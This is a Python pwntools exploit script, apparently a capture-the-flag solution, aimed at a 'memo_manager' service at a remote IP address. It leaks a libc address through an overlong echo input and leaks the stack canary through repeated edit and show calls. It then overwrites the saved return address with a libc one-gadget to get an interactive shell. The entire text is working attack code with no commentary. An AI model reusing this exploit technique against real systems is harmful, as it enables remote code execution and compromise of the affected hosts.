from pwn import *

r = process('memo_manager')
r = remote('140.110.112.77', 2115)

def echo(data):
    r.recvuntil('choice:')
    r.sendline('1')
    r.recvuntil('say:')
    r.send(data)    

def store(index, data):
    r.recvuntil('choice:')
    r.sendline('2')
    r.recvuntil('?:')
    r.sendline(str(index))
    r.recvuntil(' :')
    r.send(data)

def show(index):
    r.recvuntil('choice:')
    r.sendline('3')
    r.recvuntil('?:')
    r.sendline(str(index))

def edit(index, data):
    r.recvuntil('choice:')
    r.sendline('4')
    r.recvuntil('?:')
    r.sendline(str(index))
    r.recvuntil(' :')
    r.send(data)

def bye():
    r.recvuntil('choice:')
    r.sendline('5')

# libc6_2.23-0ubuntu11.2_amd64
libc_one_gadget_offset = 0xf1207
libc_atoi_offset = 0x36e90

echo('a' * 0x48)
libc_base = u64(r.recvline().strip()[-6:] + '\0\0') - 0x36e90 - 0x10
libc_one_gadget = libc_base + libc_one_gadget_offset
print('libc base: {}, libc one gadget: {}'.format(hex(libc_base), hex(libc_one_gadget)))
raw_input('debug: ')
store(1, 'a' * 16)
store(2, 'b' * 16)
store(3, 'c' * 16)
edit(1, 'd' * 16)
edit(3, 'e' * 16 + 'f' * 9)
show(3)
canary = '\0' + r.recvline().strip()[-13:-6]
print(hex(u64(canary)))
edit(3, 'g' * 16 + '\0')
edit(1, 'h' * 16)
edit(3, 'i' * 24 + canary + 'i' * 8 + p64(libc_one_gadget))
bye()

r.interactive()
